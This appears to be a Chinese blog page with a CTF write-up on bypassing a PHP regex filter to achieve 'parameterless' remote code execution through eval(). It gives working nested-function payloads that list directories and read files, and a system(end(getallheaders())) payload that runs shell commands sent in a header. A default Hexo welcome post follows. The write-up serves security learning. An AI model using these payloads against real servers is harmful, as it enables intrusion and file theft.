        <time title="修改时间：2020-11-29 12:25:10" itemprop="dateModified" datetime="2020-11-29T12:25:10+08:00">2020-11-29</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目源码：</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/1.png"></p>
<p>eval函数：php的任意代码执行</p>
<p>GET传参，传入code参数，如果code经过正则匹配与“；”相等，就会执行eval，所以我们要看如何绕过正则，正则匹配到 <code>/[^\W]+\((?R)?\)/</code>  ，它会替换为空 ‘ ‘，然后会等于分号 ‘;’，（例如：?code=echo();      ?传参code，传入echo()，被替换为空的话，就等于分号）如果等于分号，就会绕过这个正则。</p>
<p>正则中，\W：表示a-z、A-Z，数字，下划线。(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，(?R)? 这里多一个?表示可以有引用，也就是说可以衍生匹配。</p>
<p><code>/[^\W]+\((?R)?\)/</code>，只匹配<code>字符串+()</code>的类型，并且括号内为空字符串仅可以由26个小写字母组成。</p>
<p>如：$code=”echo();”;   传入一个code是echo()，经过这个正则把它匹配到的东西替换为空，如图：</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/echo.jpg"></p>
<p>嵌套也可以被匹配，然后替换为空，如：echo(phpinfo());</p>
<p>同上，输出：；</p>
<p>而如果在这个参数中输入123，echo(123)，就不能匹配了：</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/123.jpg"></p>
<p>题目的意思，就是我们传入的参数，要符合函数嵌套的形式，才能绕过这个正则，然后利用echo(phpinfo());去读取flag，传入eval中</p>
<p>那么现在就要想办法利用这种形式，以读取flag。</p>
<p>可以通过读取网站的目录，看看目录有没有flag，用以下函数可以读取目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(&#39;.&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如图，读取了目录</p>
<p>如果目录中有flag，那我们就可以读取flag，将下面方框中的tp5改为flag.php</p>
<p><img src=""></p>
<p>但是有一个问题，就是scandir这个函数含有字符”.“，而前面讲过，不能含有字符，否则正则无法被匹配。</p>
<p>那么，就要构造这个点。</p>
<h3 id="构造点"><a href="#构造点" class="headerlink" title="构造点"></a>构造点</h3><h5 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h5><p>localeconv()会返回当地的金融信息的数组，其第一个元素即为点。pos():取第一个元素</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(pos(localeconv()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结合scandir：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/.1.jpg"></p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/adc13908ac2db0a22fc88c1e5cb73e8.jpg"></p>
<p>end函数：</p>
<p>读取数组中的最后一个元素，并输出</p>
<p>此处数组中含多个元素，而flag文件位于最后，因此使用end，只读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(scandir(pos(localeconv()))));</span><br></pre></td></tr></table></figure>

<p>readfile函数：读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>输入网址，查看页面源代码</p>
<p>如图：</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/%E6%9F%A5%E7%9C%8B%E9%A1%B5%E9%9D%A2%E6%BA%90%E4%BB%A3%E7%A0%81.jpg"></p>
<h5 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h5><p>利用当前秒数构造点 ，localtime()中第46秒在Allsc码表中为点。</p>
<p>缺点：较为麻烦，需等到46秒才能构造出点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(chr(pos(localtime())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>结合scandir：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>



<h5 id="SESSIONID"><a href="#SESSIONID" class="headerlink" title="SESSIONID"></a>SESSIONID</h5><p>用session来传参，读取文件名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>需要抓包，在cookie出传参：</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/7288f39189fe8f53a82b16bc792b6f6.jpg"></p>
<h5 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h5><p>end读取请求头的最后一条信息，然后传入system</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders()))); </span><br></pre></td></tr></table></figure>

<p>输入网址：<a target="_blank" rel="noopener" href="http://47.98.234.232:28085/code.php?code=echo(system(end(getallheaders()">http://47.98.234.232:28085/code.php?code=echo(system(end(getallheaders()</a>))); </p>
<p>然后抓包</p>
<p>在最后一行输入ls，显示会返回flag.php</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/ls.jpg"></p>
<p>于是再将ls改为cat flag.php，就可以读取flag了</p>
<p><img src="https://zhuang-yongyi.gitee.io/yoyo/ls/cat.jpg"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/10/31/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/31/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-10-31 00:21:27" itemprop="dateCreated datePublished" datetime="2020-10-31T00:21:27+08:00">2020-10-31</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-09-29 20:16:42" itemprop="dateModified" datetime="2020-09-29T20:16:42+08:00">2020-09-29</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Hello-Hexo"><a href="#Hello-Hexo" class="headerlink" title="Hello Hexo"></a>Hello Hexo</h2><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">左</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  


















  








  

  

</body>
</html>
